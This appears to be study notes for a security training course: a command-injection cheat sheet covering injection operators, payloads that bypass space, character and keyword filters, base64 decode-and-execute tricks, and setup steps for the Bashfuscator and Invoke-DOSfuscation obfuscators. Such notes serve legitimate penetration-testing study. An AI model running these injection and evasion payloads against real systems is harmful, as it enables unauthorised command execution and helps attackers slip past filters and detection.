# Command Injection

### Injection operators

| **Injection Operator** | **Injection Character** | **URL-Encoded Character** | **Executed Command**                       |
| ---------------------- | ----------------------- | ------------------------- | ------------------------------------------ |
| Semicolon              | `;`                     | `%3b`                     | Both                                       |
| New Line               | `\n`                    | `%0a`                     | Both                                       |
| Background             | `&`                     | `%26`                     | Both (second output generally shown first) |
| Pipe                   | `\|`                    | `%7c`                     | Both (only second output is shown)         |
| AND                    | `&&`                    | `%26%26`                  | Both (only if first succeeds)              |
| OR                     | `\|\|`                  | `%7c%7c`                  | Second (only if first fails)               |
| Sub-Shell              | ` `` `                  | `%60%60`                  | Both (Linux-only)                          |
| Sub-Shell              | `$()`                   | `%24%28%29`               | Both (Linux-only)                          |

### Bypassing space filtering

```sh
# Use tab instead of space
%09
127.0.0.1%0a%09id

# Use $IFS => environment variable which counts as a space
${IFS}
127.0.0.1%0a${IFS}id

# Use brace expansion => automatically adds spaces betweend arguments wrapped in braces
127.0.0.1%0a{ls,-la}
```

### Bypassing blacklisted characters

```sh
# Produce a /
${PATH:0:1}

# Produce a ;
${LS_COLORS:10:1}

# If we need more bypasses from Linux env variables, use the below command and search
printenv

# Produce a \ (for windows)
echo %HOMEPATH:~6,-11%    # From cmd
$env:HOMEPATH[0]          # From Powershell

# If we need more bypasses from Linux env variables, use the below command and search
Get-ChildItem Env:

# Shift the character we pass by 1 => find the character before the one we want in the
# ASCII table 
# Produces a \ 
man ascii     # \ is on 92, before it is [ on 91
echo $(tr '!-}' '"-~'<<<CHARACTER)
```

### Bypassing blacklisted commands

```sh
# Try to "obfuscate" the word
# We can't mix the quote types and the number must be even
w'h'o'am'i    
w"h"o"am"i    

# Linux only
who$@ami
w\ho\am\i
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
$(a="WhOaMi";printf %s "${a,,}")

echo 'whoami' | rev   # Reverse command
$(rev<<<'imaohw')

echo -n '<COMMAND>' | base64   # Encode / decode
bash<<<$(base64 -d<<<<B64>)

# Windows only
who^ami
WhOaMi

"whoami"[-1..-20] -join ''   # Reverse command
iex "$('imaohw'[-1..-20] -join '')"

[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('<COMMAND>'))   # Encode / decode
echo -n whoami | iconv -f utf-8 -t utf-16le | base64
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('<B64>')))"
```

### Evasion tools

```sh
# Install
git clone https://github.com/Bashfuscator/Bashfuscator
cd Bashfuscator
pip3 install setuptools==65
python3 setup.py install --user
cd ./bashfuscator/bin/

# Obfuscate a command
./bashfuscator -c '<COMMAND>' -s 1 -t 1 --no-mangling --layers 1

# Test the generated command
bash -c <GENERATED_COMMAND>

# For Windows
git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
cd Invoke-DOSfuscation
Import-Module .\Invoke-DOSfuscation.psd1
Invoke-DOSfuscation
Invoke-DOSfuscation> help

# Obfuscate a command
Invoke-DOSfuscation> SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
Invoke-DOSfuscation> encoding
Invoke-DOSfuscation\Encoding> 1
```

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space" %}
